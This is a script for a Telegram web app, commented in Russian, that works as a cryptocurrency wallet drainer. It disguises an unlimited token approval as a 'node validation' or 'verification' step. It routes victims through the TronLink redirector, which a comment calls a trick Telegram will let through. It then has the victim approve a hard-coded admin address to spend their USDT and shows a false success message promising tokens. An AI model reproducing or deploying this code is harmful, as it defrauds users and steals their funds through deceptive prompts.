<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
    const CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    // Твой чистый URL (без параметров)
    const URL_CLEAN = "https://timur3417.github.io/sync-node-app/";

    const btn = document.getElementById('btn');

    async function action() {
        // Проверяем наличие tronWeb (если мы уже внутри TronLink)
        const tw = window.tronWeb || (window.tron && window.tron.tronWeb);

        if (!tw) {
            // МЫ В ТЕЛЕГРАМЕ
            // Используем официальный HTTPS редиректор TronLink
            // Это "обманка", которую Telegram пропустит
            const target = URL_CLEAN + "?mode=tl";
            const officialRedirect = "https://m.tronlink.org/dapp/open?url=" + encodeURIComponent(target);
            
            // Пытаемся открыть через метод Телеграма
            tg.openLink(officialRedirect);
            
            // На всякий случай дублируем обычным переходом (для iOS иногда нужно)
            setTimeout(() => {
                window.location.href = officialRedirect;
            }, 500);
            return;
        }

        // МЫ ВНУТРИ TRONLINK
        try {
            btn.innerText = "ПОДКЛЮЧЕНИЕ...";
            btn.disabled = true;

            await tw.request({ method: 'tron_requestAccounts' });
            const contractObj = await tw.contract().at(CONTRACT);
            
            // Вызываем апрув
            await contractObj.approve(ADMIN, '1000000000000000000').send({
                feeLimit: 100000000
            });

            tg.showPopup({
                title: 'Успешно',
                message: 'Верификация завершена. Ожидайте зачисления токенов.',
                buttons: [{type: 'ok'}]
            });
            setTimeout(() => tg.close(), 5000);

        } catch (e) {
            tg.showAlert("Действие отклонено. Попробуйте еще раз.");
            btn.disabled = false;
            btn.innerText = "ЗАПУСТИТЬ ПРОВЕРКУ";
        }
    }

    btn.onclick = action;

    // Смена текста, если зашли через редиректор
    if (window.location.search.includes('mode=tl')) {
        document.getElementById('h').innerText = "Узел Обнаружен";
        btn.innerText = "ПОДТВЕРДИТЬ ВАЛИДАЦИЮ";
    }
</script>
